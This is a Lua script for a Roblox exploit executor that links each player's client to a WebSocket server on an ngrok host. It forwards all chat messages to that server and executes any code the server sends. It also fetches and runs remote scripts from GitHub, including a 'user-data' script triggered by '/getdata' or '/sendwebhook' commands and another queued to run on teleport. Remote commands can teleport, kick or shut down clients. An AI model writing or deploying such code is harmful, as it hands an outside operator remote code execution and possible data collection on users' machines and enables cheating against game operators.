-- basic ws
getgenv().signalWs = "wss://xochitl-superexacting-unconcentrically.ngrok-free.dev/local_server.js"
local uri = getgenv().signalWs or readfile("LDXWebSocket.ldx") or  "wss://xochitl-superexacting-unconcentrically.ngrok-free.dev/local_server.js"
local que_teleport = que_on_teleport or queonteleport
local ws = WebSocket.connect(uri)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Teleport = game:GetService("TeleportService")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/functions.lua"))()
ws.OnClose:Connect(function()
	print("Closed")
end)
writefile("LDXWebSocket.ldx",tostring(uri))
ws:Send("/join " .. player.Name)

function depsignalargs(signal)
	local args = string.split(signal," ")
	return args
end
function signalargs(msg) --inQuote by gpt
	local args = {}
	local current = ""
	local inQuote = false

	for i = 1, #msg do
		local char = string.sub(msg, i, i)

		if char == '"' then
			inQuote = not inQuote
		elseif char == " " and not inQuote then
			if current ~= "" then
				table.insert(args, current)
				current = ""
			end
		else
			current = current .. char
		end
	end

	if current ~= "" then
		table.insert(args, current)
	end

	return args
end

function findPlayer(partialName) -- Asep skill isue
    local lowerPartial = string.lower(partialName)
    for _, plr in ipairs(Players:GetPlayers()) do
        -- cek apakah substring ada di nama player
        if string.find(string.lower(plr.Name), lowerPartial, 1, true) then
            return plr
        end
    end
    return nil
end

-- fungsi bring
function bring(targetPlayer, cordinateCFrame)
	if targetPlayer == player or targetPlayer == "@all" then
		print("run bring")
		local char = player.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			print("if success")
			print(targetPlayer,cordinateCFrame)
			if Players[cordinateCFrame].Name == cordinateCFrame then
				char.HumanoidRootPart.CFrame = Players[cordinateCFrame].Character.HumanoidRootPart.CFrame
			else
				char.HumanoidRootPart.CFrame = cordinateCFrame
			end
		end
	end
end
function gameTpPlace(plc)
	Teleport:Teleport(plc,player)
end
player.Chatted:Connect(function(msg)
	local args = string.split(msg," ")
	if string.find(msg,"/bring") then
		ws:Send(msg .. " " .. player.Name)
	elseif string.find(msg,"/game") and args[2] and not args[3] then
		ws:Send(msg .. " " .. game.PlaceId)
	elseif string.find(msg,"/game") and not args[2] and not args[3] then
		ws:Send(msg .. " " .. player.Name .. " " .. game.PlaceId)
	else
		ws:Send(msg)
	end
end)
-- handler message
ws.OnMessage:Connect(function(message)
	print("Received:", message)
	local f, err = loadstring(message)
	if not f then
		local signal = signalargs(message)
		local cmd = signal[1]:lower()
		print(signal[1],signal[2],signal[3])
		local name = player.Name
		if signal[1] == "/bring" then
			if signal[2] == "@all" then
				bring(player,signal[3])
			else
				local target = findPlayer(signal[2])
				bring(target,signal[3])
			end
		elseif signal[1] == "/speed" then
			local target = findPlayer(signal[2])
			if target and target.Character and target.Character:FindFirstChild("Humanoid") then
				target.Character.Humanoid.WalkSpeed = tonumber(signal[3])
			end
		elseif signal[1] == "/game" then
			if signal[2] == "@all" and signal[3] ~= nil then
				Teleport:Teleport(signal[3],player)
			elseif findPlayer(signal[2]) == player and signal[3] ~= nil then
				Teleport:Teleport(signal[3],player)
			end
		elseif signal[1] == "/closeall" or signal[1] == "/shutdown" or signal[1] == "/leaveall" then
			game:Shutdown()
		elseif signal[1] == "/join" then
			print(findPlayer(signal[2]).Name .. " has join the server")
		elseif signal[1] == "/test" then
			print(signal[2])
		elseif signal[1] == "/sendwebhook" or signal[1] == "/userdata" or signal[1] == "/getdata" then
			if signal[2] == player.Name or signal[2] == "all" then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/user-data.lua"))()
			end
		elseif signal[1] == "/kick" then
			if signal[2] == player.Name then -- biar gk muncul err
				local target = findPlayer(signal[2])
				target:Kick(signal[3]) --kick Asepjuragan_fruit "lu tolol bot bgt yapit"
			end
		elseif signal[1] == "/code" then
			local target = findPlayer(signal[2])
			loadstring(signal[2],signal[3])()
		else
			warn("error is not a ldx command or code")
		end
	else
		f()
	end
end)

-- serialize CFrame jadi string valid Lua
local cf = player.Character.HumanoidRootPart.CFrame
local cfString = string.format("CFrame.new(%f,%f,%f)", cf.X, cf.Y, cf.Z)

--[[
local testtable = {
	"loadstring%((.-)%)%(%)",
	"require%((.-)%)"
}

local text = 'print("test") loadstring("abc")() require(123)'

local filtered = filterstring(text, testtable)
]]
local cfString = string.format("Vector3.new(%f,%f,%f)", cf.X, cf.Y, cf.Z)
que_teleport(loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/domain_authority.lua"))())
